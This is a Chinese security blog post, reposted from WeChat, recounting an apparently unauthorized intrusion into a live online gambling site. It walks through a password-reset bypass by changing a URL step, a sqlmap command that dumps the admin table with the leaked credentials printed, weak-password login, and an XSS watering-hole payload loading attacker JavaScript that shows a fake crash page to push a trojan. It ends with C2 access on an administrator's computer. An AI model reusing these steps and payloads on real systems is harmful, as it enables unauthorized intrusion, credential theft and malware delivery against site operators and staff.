<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Dfq_OmDvkj7awf8tv8-gcw)

点击上方 [蓝字]，关注我们

**建议大家把公众号 “Z2O 安全攻防” 设为星标，否则可能就看不到啦！**因为公众号现在只对常读和星标的公众号才能展示大图推送。操作方法：点击右上角的【...】，然后点击【设为星标】即可。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuao3T9EnGbUIqxgDhEVicCV8NbH4FiaZ3YIbpXNEr6qFicGkAelnQHKGHsVlfapMGgO3DHA68iaiac0n4Q/640?wx_fmt=png)

免责声明
====

本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号团队不为此承担任何责任。

文章正文
====

### 前言

　最近闲来无事，好久也没实战了，直接找 BC 开刀，最后全靠 XSS 上线。

### 信息搜集

　　首页如下，我随手输入一个 admin 123456，果然没有奇迹发生  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1dPAmXhYDsicukJL1yiceSy77fBydmYib4dPFCibpYawQA4GKDvf5wQt0gg/640?wx_fmt=png&from=appmsg)

  
　　点击忘记密码，输入 admin  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1BDDBGUK8LJqR6LzFGLeycObdhu5r6h8uxV96y5EMFGFslPBcLTDDGw/640?wx_fmt=png&from=appmsg)

  
　　很好，至少说明存在 admin 账号  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1aXWNAJsibeonc2gWRUBGE7RlKK3Hmxg1dE6ayHlsCqS9hMw8u4YLnsw/640?wx_fmt=png&from=appmsg)

  
　　上图 url 为`Public.forgetPaw1.userName.admin.do`，我直接修改成`Public.forgetPaw2.userName.admin.do`后。芜湖，成功绕过验证，赶紧设置一个新密码，登录进去看看，其实这里也可以随便注册的，但我就想看看 admin 账号有什么东西。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1nVRokPqYj5SgwEzibHM5KxzLkdIWtliaYj4AJE10F0n5ulE7Eo0jPsag/640?wx_fmt=png&from=appmsg)

  
　　看这中奖榜心动不，再看看此账户余额 0 元，我就知道这是个假账号  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1B4d37e9M96joWGgUYznLY4Or42L9pQy9FkMzoPQjxrGINDDtwPrgbg/640?wx_fmt=png&from=appmsg)

  
　　看看个人中心的交易等等记录，全部都是空的，假账号实锤  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1Jr2FADbkibPbyRUibNHpy1b4F6CKPusmREjGOPxGlicZSCDeU1HORgQzA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1xQegBWqXxiaxIWS98ZqGqm66enKywSGcBYuia0iag7VCvTOcrLib3fsbQQ/640?wx_fmt=png&from=appmsg)

  
　　看到头像，立马找上传点，好家伙呀，头像都不能自己上传，安全性真高呀。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1A9B8kticXJOibiamTSwKkCgiaXiaxG1KbrkACZYHCXibWsouj8KMuZkXvEiaw/640?wx_fmt=png&from=appmsg)

  
　　在此页面，到处点点，翻翻翻，都没找到可利用的地方。主要是功能太少了，来到客服页面，尝试一波 XSS 看能打上线不。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1bltPlCOYz1H6DXBRHxp8VEZ5vNn6jujow24yic8pR5H6JAibkEMS65sA/640?wx_fmt=png&from=appmsg)

  
　　这聊天界面，一输入`<script>`字符，就被跳转到下面的留言框，看来是有 waf 的。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1RaXNOdehX6EicmfrFGZoHRnJS45kTleetHk100GWZlZQdiaLgpsSre2A/640?wx_fmt=png&from=appmsg)

  
　　这不上传点来了嘛，抓包一看，腾讯云的 waf，客服页面我是打不动了。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf183dqPYCrShnbN6svNTqz7OO2BiabPpWwo0LaV8fft7r3FeCKSCM3jgQ/640?wx_fmt=png&from=appmsg)

  
　　扫扫目录，基本啥也没有  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1QKtTUWRPHzbAoJ2gTOHuBafBMa1b9U7gwhjxjhp3fRKKbSAmoQbdgQ/640?wx_fmt=png&from=appmsg)

  
　　看看 index.html，宝塔搭建  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1wuiaaRNryohUc6DGeUBLp5fQmBiaOIvyvmvG0eZVPD1gDNHEe63b8cCw/640?wx_fmt=png&from=appmsg)

  
　　随便在 url 栏，乱输入，爆路径了  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1Ddo7P5oq8sOjwKusg0AbQGJtnmT16vdwxYgTQyEd7ntzUoO9qo77Kg/640?wx_fmt=png&from=appmsg)

  
　　赶紧记下绝对路径，后面可能有用，这不 ThinkAdmin 嘛，基于 ThinkPHP 开发的，拿出工具开始梭哈。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1tPNpdOsZMic2AopSRwHYSCy6m5SptNPxMgBdz2KmL4iaywqEoicBsum1Q/640?wx_fmt=png&from=appmsg)

### SQL 注入

　　梭哈失败后。用 fofa 找到了后台登录页面  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1UZqNLvhHCaGF1vJ4ERQj9kOBiapGUpmaicsV2dAibQ2K7CjJRiaJFdIKpw/640?wx_fmt=png&from=appmsg)

  
　　再次用 ThinkPHP 利用工具梭哈，竟然有个日志泄露，而下面的工具梭哈主站是找不到日志泄露的，所以渗透的时候要多仔细。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf17H2oO6YvpDQ0fPDBmcBjasnZ32HjtMqyWw5rnbmcxlicUoZw3rGDGRA/640?wx_fmt=png&from=appmsg)

  
　　下载下来看了看日志的信息也没有啥，也可以去遍历它的日志，再筛选出有用的信息，不过太漫长了，而且也不一定有回报，这条路我就放弃了。登录页面试了试弱口令无果。登录页面抓包放到 slqmap 跑跑  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1zIJfxwib4zf00ER1nkCHE6hjmfeokC641fEnibicKdKkK68VkaviacD24A/640?wx_fmt=png&from=appmsg)

  
　　出 sql 延时盲注了，注入点在`info[name]`  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1cHHhN3OoDAibdrGSyKnHE5Req7QibMhicVFXlZyKSiarxKpnl6ZOtejN0A/640?wx_fmt=png&from=appmsg)

  
　　后面经过漫长的等待，终于找到管理员的账号了

```
python sqlmap.py -r 1.txt --random-agent --force-ssl --technique=T --proxy=socks5://127.0.0.1:10808 -D caipai -T caipiao_adminmember -C username,password,safecode --dump

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1u9poPhnFrHCOQl8oLUmXMUbLIoXvA3OXRYs1Msw4DOoaX7N7WN93Aw/640?wx_fmt=png&from=appmsg)

  
　　账号信息 `keful:MDAwMDAwMDAwMLGIet6Gp7lr:147258`，`admin:MDAwMDAwMDAwMLZ8ftWaqtCpmb2ooMR5nKevjJKEfop2dQ:159357`  
　　这密码咋看都不像 md5，果然解不出来  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1JxseRjUdkH79EdZpsTHvIIPXOeOpkUerxAFAsLDIeZickia6GYvwG9IA/640?wx_fmt=png&from=appmsg)

  
　　遇到困难不要怕，不就是密码解不出嘛，我反手一个 123456，keful 账号就成功进去了，弱口令永远的神。大哥留个联系方式呀，源码给我一个。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1k3XxKromuPoia67ibbtcicicrNhhMS5Kib3DDhe9dI9EZ1fJdDv5jibqJUiaQ/640?wx_fmt=png&from=appmsg)

  
　　又到了经典的找上传点环节，这下后台连修改头像的按钮都没有，比前台更安全。看了看充值记录和提现记录，我的评价是一眼丁真，鉴定为假。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1syeKOiapfr2UZAIfMlnVu1AEPRGIXtficVU9q7HSPwo3KUA2o2UM9drw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1ibria5205QRJtVcWaAZMFSVicXa8icoEf7YTTm5T2eMibuTUtT99aghU94Q/640?wx_fmt=png&from=appmsg)

  
　　试了试前面的绝对路径上传文件，失败。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1LG9STzaSZNblxbt2cqhibMIzFNkR9YOzrIrC0q5obU4OE1k0KhsN0iag/640?wx_fmt=png&from=appmsg)

  
　　用的 KindEditor 编译器版本 4.1.10，它存在 CVE-2017-1002024 文件上传漏洞，不过这里没有，遗憾。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1lZ8yoN5czf4r0w07ia7mS1FTx5f0l0Qxsml3db8nnSHsGttuQ8gvo2g/640?wx_fmt=png&from=appmsg)

### XSS 水坑钓鱼

　　进展卡在这里了，后来师傅指点可以用 XSS 水坑钓鱼。这里我没进行页面跳转，直接利用 xss 加载伪造页面，收杆的话使用服务端做判断。如果对方不下载木马，那他就会一直卡在这个崩溃页面，除非他会 f12 禁用 js。本地测试 xss，XSS 平台成功收到信息。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf13Jqiah5bjRogYHMSAPoH9xOukzdSXaCUdgA2tZYsZbzsYZZSODv6Odg/640?wx_fmt=png&from=appmsg)

  
　　在写 xss 的 payload 的时候，URL 处一定要是 `<script src=//test/xss.js></script>` 这样的，而不是这样 `<script src="https://test/xss.js"></script>` ，也不能是这样 `<script src="http://test/xss.js"></script>`。因为如果你写成`https://test/xss.js`，而目标站点用 http 协议的话，是连不上 xss 平台的，反之亦然。所以使用 `//test/xss.js` 这样的写法，让它自动切换协议，保证和目标站一致。  
　　找插入 xss 的点要考虑三个问题。第一个，插入后的 xss payload 最好能被编辑。第二个管理员最好刚刚登录页面，就渲染我们的恶意 js。第三个，不要影响到前台的正常用户。  
　　第一个 xss 点，下面的框框是可以随便 xss 的，但是一旦成功插入，就不能再编辑我们的 xss 了，所以这个点暂时放弃。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1S0NoxQDzhDJWYaO2z6l3IWPBLBOxu25PvQTFNOgMgwxH22O1rWp1Iw/640?wx_fmt=png&from=appmsg)

  
　　第二个 xss 点，这里就能反复编辑，但是有可能影响到前台用户，测试的时候，用 h3 标签，如果 h3 都不行，那 script 标签也基本没戏。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf17iczIocEMPDa6mCic9iaUhNNzMrEVtlvN4w29pW0QzooROMIgENnVVOXQ/640?wx_fmt=png&from=appmsg)

  
　　成功 xss  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1eEzzkZjhzwZQaCOickLo3W0vBmrFjXibHms6rHK0s4P04nOxPCvffn3Q/640?wx_fmt=png&from=appmsg)

  
　　后面我反复找 xss 点，都没找到一个满意的点，始终不能满足我前面提到的 3 个问题。算了，管它的，就在这里插入我的恶意 js。等管理员上线，再点击内容管理中的咨询栏目管理，才能触发，行吧，慢慢等吧。  
　　几天后，查看 c2 平台，已经成功上线了，哎，柬埔寨老哥，又是被骗过去的，祝你早日回家吧。  
　　

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1JOiajhWUFbIt1XOzNCxVicDeW8Yhfd4wE9hpib3jyFVBrDpSYjhUgMBfA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1WmIwibPhOdkac19ruQTPW9YA3h0anib0vlBCJ6uZ2icNGUMfJ9AlqHToA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuYukZVbR8xtUcbXqCDXGxf1KPSurIUklFv4INkBiaTJgIiac419oPacghuNyc6hYicfcnWnfheIGSYUg/640?wx_fmt=jpeg&from=appmsg)

### 总结

　　这是我第一次打下 bc 站，而面对非常规站点，要出邪招。这种最终目标是要拿到个人或客服的机子权限，而不是拿下服务器。因为大部分有用的信息都在个人机上。如果拿下了服务器，就需要在管理员的必经之路上，插入恶意 js。比如直接在后台页面加入恶意 js，这样又形成水坑钓鱼，让管理员上线。最快的方式就是在客服聊天界面，找 XSS，这就考验师傅们的绕过功底了。

文章来源：https://maidang.cool/2023/52542.html

技术交流
====

### 学习圈子

一个引导大家一起成长，系统化学习的圈子。

如果看到这里的师傅是基础不够扎实 / 技术不够全面 / 入行安全不久 / 有充足时间的初学者... 其中之一，那么欢迎加入我们的圈子，圈子提供以下内容：（[点我了解详情](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247498684&idx=1&sn=71c923f29d6431f6271398d435f96ae0&chksm=ceab10fcf9dc99ea174325e6982af84d0331aeee2cb0196ac11405acd44283c18da31e77d553&scene=21#wechat_redirect)）

**1、每周发布学习任务，由浅入深，循序渐进，从常见的 Web 漏洞原理与利用、业务逻辑漏洞与挖掘，到 WAF 绕过、代码审计、钓鱼与免杀，再到 Linux/Windows 内网、提权、权限维持、隧道代理、域渗透，层层递进。会发布相应的参考资料及建议，成员自行学习实践，并会根据每周任务选取 1-3 位完成优秀的成员，返还入圈费用。**

2、日常分享优质学习资源与攻防渗透技巧，包括但不限于渗透 tips、教程、手册、学习路线等。

3、一个学习氛围浓厚的社区，遇到问题可以快速提问、交流讨论，共同学习。

*   目前已经规划了几个月的内容：  
    

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuahtvW1AAaVwkiak2uUsfPG0l9g8D7QJJSqm045JAKlETvrYtCbDORPA5cWGDicPVFOovuOibZFnWTWA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

第一周的学习任务将在 **2024.1.1** 发布，**在此之前加入圈子会有一定优惠**，先来就是赚到，欢迎加入我们，一块学习：

                     ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKua4PgCbFWvSAw9iaITiaRhcyJB8MXPtSRMLKgLGiaic2SxVsTr3hfSialoeibzMBlyUicjYrGbYSx43wLoPg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1) 

### 交流群

关注公众号回复 “**加群**”，添加 Z2OBot 好友，自动拉你加入 **Z2O 安全攻防交流群 (微信群)** 分享更多好东西。**（QQ 群可直接扫码添加）**

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYMO5aHRB3TbIy3xezlTAkbFzqIRfZNnicxSC23h1UmemDu9Jq38xrleA6NyoWBu1nAj0nmE6YXEHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### 关注我们

**关注福利：**

**回复 “****app****" 获取  app 渗透和 app 抓包教程**

**回复 “****渗透字典** **" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**

**回复 “****书籍** **" 获取 网络安全相关经典书籍电子版 pdf**

****回复 “资料** **" 获取 网络安全、渗透测试相关资料文档****

点个【 在看 】，你最好看